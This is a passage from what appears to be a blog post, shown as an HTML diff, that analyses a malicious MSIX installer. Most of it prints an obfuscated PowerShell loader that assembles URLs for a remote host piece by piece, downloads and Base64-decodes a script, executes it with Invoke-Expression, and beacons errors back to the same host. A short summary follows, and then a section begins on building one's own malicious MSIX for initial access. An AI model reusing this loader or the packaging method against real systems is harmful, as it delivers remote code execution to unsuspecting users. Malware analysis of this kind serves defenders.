style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;d&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;c&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;c&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;7&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;3&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;c&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;d&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;3&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;d&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;6&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;5&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;3&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;d&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;3&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;2&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;3&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;8&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;2&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;9&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;3&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;3&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;9&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;3&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;$($NToddpkHJ)&#34;</span>
+                <span style="color:#f92672">$</span>xsLfdudkQBktwfQQjItfw <span style="color:#f92672">=</span> <span style="color:#f92672">$</span><span style="color:#a6e22e">aTebwwaowsbbrUUTopUZpsjZ.DownloadString</span>(<span style="color:#f92672">$</span>NQdQ)
+                <span style="color:#f92672">$</span>viSrdkNrrPrYdF <span style="color:#f92672">=</span> [System.Text.Encoding]<span style="color:#f92672">::</span><span style="color:#a6e22e">Unicode.GetString</span>([System.Convert]<span style="color:#f92672">::</span><span style="color:#a6e22e">FromBase64String</span>(<span style="color:#f92672">$</span>xsLfdudkQBktwfQQjItfw))
+                Invoke<span style="color:#f92672">-</span>Expression <span style="color:#f92672">$</span>viSrdkNrrPrYdF
+            }
+            catch {
+                <span style="color:#f92672">$</span>HcEAjXEDFgAUtMMiPwLicU <span style="color:#f92672">=</span> <span style="color:#f92672">$</span>_.Exception.Message
+                <span style="color:#f92672">$</span>icFJZsoaoaorsrDtZWvtoFQitW <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;?IhU=$($HKDoaKaxv)&amp;HZsZsos=$($HcEAjXEDFgAUtMMiPwLicU)&#34;</span>
+                <span style="color:#f92672">$</span>jmtjjvjr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;htt&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;p&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;s://&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;prst251.boo/223dc805-5605-4a0b-b828-cdad1b84126&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-79d39c2c-0f10-48d1-9&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;df-c18a784&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;fba0&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;$($icFJZsoaoaorsrDtZWvtoFQitW)&#34;</span>
+                <span style="color:#f92672">$</span>xsLfdudkQBktwfQQjItfw <span style="color:#f92672">=</span> <span style="color:#f92672">$</span><span style="color:#a6e22e">aTebwwaowsbbrUUTopUZpsjZ.DownloadString</span>(<span style="color:#f92672">$</span>jmtjjvjr)
+            }
+        }
+    } else {
+        try {
+
+            Invoke<span style="color:#f92672">-</span>Expression <span style="color:#f92672">$</span>viSrdkNrrPrYdF
+        }
+        catch {
+
+            <span style="color:#f92672">$</span>HcEAjXEDFgAUtMMiPwLicU <span style="color:#f92672">=</span> <span style="color:#f92672">$</span>_.Exception.Message
+            <span style="color:#f92672">$</span>icFJZsoaoaorsrDtZWvtoFQitW <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;?IhU=$($HKDoaKaxv)&amp;HZsZsos=$($HcEAjXEDFgAUtMMiPwLicU)&#34;</span>
+            <span style="color:#f92672">$</span>jmtjjvjr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;htt&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;p&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;s://&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;prst251.boo/223dc805-5605-4a0b-b828-cdad1b84126&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-79d39c2c-0f10-48d1-9&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;df-c18a784&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;fba0&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;$($icFJZsoaoaorsrDtZWvtoFQitW)&#34;</span>
+            <span style="color:#f92672">$</span>xsLfdudkQBktwfQQjItfw <span style="color:#f92672">=</span> <span style="color:#f92672">$</span><span style="color:#a6e22e">aTebwwaowsbbrUUTopUZpsjZ.DownloadString</span>(<span style="color:#f92672">$</span>jmtjjvjr)
+            try {
+                <span style="color:#f92672">$</span>NToddpkHJ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;?aklshdjahsjdh=$($Cg)&amp;ajhsdjhasjhd=nsp&amp;ahsdjkasjkdh=$($($HKDoaKaxv))&#34;</span>
+                <span style="color:#f92672">$</span>NQdQ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;htt&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;p&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;s://&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;p&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;r&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;s&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;t&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;2&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;5&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;.&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;b&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;o&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;o&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;9&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;7&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;d&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;3&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;3&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;8&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;c&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;d&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;c&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;c&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;f&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;7&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;3&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;c&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;d&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;3&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;d&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;6&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;5&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;3&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;d&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;3&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;2&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;3&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;8&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;2&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;9&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;3&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;3&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;9&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;3&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;$($NToddpkHJ)&#34;</span>
+                <span style="color:#f92672">$</span>xsLfdudkQBktwfQQjItfw <span style="color:#f92672">=</span> <span style="color:#f92672">$</span><span style="color:#a6e22e">aTebwwaowsbbrUUTopUZpsjZ.DownloadString</span>(<span style="color:#f92672">$</span>NQdQ)
+                <span style="color:#f92672">$</span>viSrdkNrrPrYdF <span style="color:#f92672">=</span> [System.Text.Encoding]<span style="color:#f92672">::</span><span style="color:#a6e22e">Unicode.GetString</span>([System.Convert]<span style="color:#f92672">::</span><span style="color:#a6e22e">FromBase64String</span>(<span style="color:#f92672">$</span>xsLfdudkQBktwfQQjItfw))
+                Invoke<span style="color:#f92672">-</span>Expression <span style="color:#f92672">$</span>viSrdkNrrPrYdF
+            }
+            catch {
+                <span style="color:#f92672">$</span>HcEAjXEDFgAUtMMiPwLicU <span style="color:#f92672">=</span> <span style="color:#f92672">$</span>_.Exception.Message
+                <span style="color:#f92672">$</span>icFJZsoaoaorsrDtZWvtoFQitW <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;?IhU=$($HKDoaKaxv)&amp;HZsZsos=$($HcEAjXEDFgAUtMMiPwLicU)&#34;</span>
+                <span style="color:#f92672">$</span>jmtjjvjr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;htt&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;p&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;s://&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;prst251.boo/223dc805-5605-4a0b-b828-cdad1b84126&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;-79d39c2c-0f10-48d1-9&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;df-c18a784&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;e&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;fba0&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;$($icFJZsoaoaorsrDtZWvtoFQitW)&#34;</span>
+                <span style="color:#f92672">$</span>xsLfdudkQBktwfQQjItfw <span style="color:#f92672">=</span> <span style="color:#f92672">$</span><span style="color:#a6e22e">aTebwwaowsbbrUUTopUZpsjZ.DownloadString</span>(<span style="color:#f92672">$</span>jmtjjvjr)
+            }
+        }
+    }
+}
+
+<span style="color:#f92672">$</span>JNWgNBrgNHmJNEDiBS<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;htt&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;p&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;s://&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;asana.co&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;m&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/&#34;</span>
+Start<span style="color:#f92672">-</span>Process <span style="color:#f92672">$</span>JNWgNBrgNHmJNEDiBS
+
+Receive<span style="color:#f92672">-</span>Job <span style="color:#f92672">-</span>Job <span style="color:#f92672">$</span>udGXjGVXGXbtYwiRfqjVk <span style="color:#f92672">-</span>Wait
+</code></pre></div><ul>
+<li>
+<p>In summary, this is what the script is performing:</p>
+<ol>
+<li>Starts as a background job and collects some system information such as the domain name, AV software present in the system and the domain name (line 2-11)</li>
+<li>Pulls a suspicious script from a remote URL and executes it. (line 20-80)</li>
+<li>Finally opens <a href="https://asana.com">https://asana.com</a> in the browser then waits for the background job to finish executing before exiting.</li>
+</ol>
+</li>
+<li>
+<p>This is what will contain the main logic for the implant being staged.</p>
+</li>
+</ul>
+<h2 id="building-a-malicious-msix-for-initial-access">Building a malicious msix for Initial Access</h2>
+<ul>
+<li>Now that we have a solid understanding of the file structure. Let us construct our own malicious MSIX payload that installs an application before executing our target malware.</li>
+</ul>
+<h3 id="setting-up-the-msix-packaging-tool-and-our-setup-file">Setting up the MSIX packaging tool and our setup file</h3>
+<ul>
+<li>First, you will need to install the <code>MSIX packaging tool</code> from the Microsoft Store.</li>
+</ul>
